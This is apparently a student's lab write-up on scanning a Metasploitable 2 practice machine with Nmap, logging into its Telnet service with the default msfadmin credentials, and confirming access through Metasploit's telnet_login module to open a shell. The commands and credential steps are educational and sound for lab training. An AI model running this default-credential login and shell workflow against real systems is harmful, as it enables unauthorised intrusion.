# Telnet Enumeration and Login Testing — Metasploitable 2

## Overview

This lab demonstrates the basic enumeration and authentication testing of a Telnet service running on **Metasploitable 2**.

The workflow was:

1. Scan the target with Nmap.
2. Identify the open Telnet port.
3. Identify the running Telnet service.
4. Attempt a manual Telnet login using the lab's default credentials.
5. Verify the credentials using Metasploit's `telnet_login` auxiliary module.
6. Obtain an interactive command shell.

> **Lab Environment:** This activity was performed in an isolated Metasploitable 2 virtual machine environment for educational purposes.

---

## 1. Network Scanning with Nmap

First, I scanned the Metasploitable 2 target to identify open ports and running services.

### Command

```bash
nmap -sV 192.168.56.102
```

### Relevant Result

```text
23/tcp    open    telnet    telnetd
```

The scan showed that **TCP port 23** was open and a Telnet service was running.

### Finding

* **Port:** 23/TCP
* **Service:** Telnet
* **Service:** telnetd

This indicated that the target was accepting Telnet connections.

---

## 2. Manual Telnet Login

After discovering the open Telnet service, I manually connected to the target.

### Command

```bash
telnet 192.168.56.102 23
```

The Telnet service prompted for a username and password.

For this Metasploitable 2 lab, I tested the default lab credentials:

```text
Username: msfadmin
Password: msfadmin
```

The login was successful, providing access to the target's command shell.

---

## 3. Testing with Metasploit

I then used Metasploit to verify the Telnet credentials automatically.

### Module

```text
auxiliary/scanner/telnet/telnet_login
```

### Start the module

```text
use auxiliary/scanner/telnet/telnet_login
```

### Set the target

```text
set RHOSTS 192.168.56.102
```

### Set the credentials

```text
set USERNAME msfadmin
set PASSWORD msfadmin
```

### Run the module

```text
run
```

### Result

Metasploit reported:

```text
Login Successful: msfadmin:msfadmin
```

It also opened a command shell session:

```text
Command shell session 1 opened
```

This confirmed that the credentials were valid and that authentication to the Telnet service was successful.

---

## 4. Interacting with the Shell

After the session was opened, I interacted with the shell using:

```text
sessions -i 1
```

Basic commands can then be used to identify the current user and system:

```bash
whoami
hostname
pwd
```

---

## 5. Lab Workflow

```text
Nmap Scan
    ↓
Port 23/TCP Found Open
    ↓
Telnet Service Identified
    ↓
Manual Login Attempt
    ↓
msfadmin : msfadmin
    ↓
Successful Authentication
    ↓
Metasploit telnet_login Module
    ↓
Credentials Verified
    ↓
Command Shell Session
```

---

## 6. What I Learned

Through this lab, I learned:

* How to identify open services using Nmap.
* That TCP port **23** is commonly associated with Telnet.
* How to manually connect to a Telnet service.
* How default credentials can create a security risk.
* How to use Metasploit's `auxiliary/scanner/telnet/telnet_login` module for authentication testing.
* How a successful authentication attempt can result in an interactive command shell.
* The basic workflow of **service enumeration → authentication testing → shell access**.

---

## Security Notes

Telnet transmits authentication information and session data without the protections provided by modern encrypted remote-access protocols. Because of this, Telnet is generally considered unsuitable for secure remote administration.

For authorized environments, secure alternatives such as SSH should be preferred.

---

## Tools Used

* **Nmap** — Network and service enumeration
* **Telnet** — Manual service interaction
* **Metasploit Framework** — Authentication testing
* **Metasploitable 2** — Intentionally vulnerable practice target
* **Kali Linux** — Attacking/testing machine

---

## Disclaimer

This documentation was created from an authorized local lab using **Metasploitable 2**, an intentionally vulnerable virtual machine designed for cybersecurity education and practice.

Do not perform credential testing or exploitation against systems without explicit authorization.
